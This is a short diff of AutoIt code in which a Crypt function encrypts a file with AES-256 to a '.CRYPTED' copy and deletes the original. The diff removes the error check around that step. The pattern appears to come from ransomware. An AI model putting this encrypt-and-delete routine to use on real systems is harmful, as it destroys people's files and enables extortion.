@@ -28,10 +28,8 @@ Func _Randomstring($length)
 EndFunc
 
 Func Crypt($file)
-	If Not @error Then
 	_Crypt_EncryptFile($file, $file & '.CRYPTED', $key, $CALG_AES_256)
 	FileDelete($file)
-	EndIf
 EndFunc
 
 Func Decrypt($file)
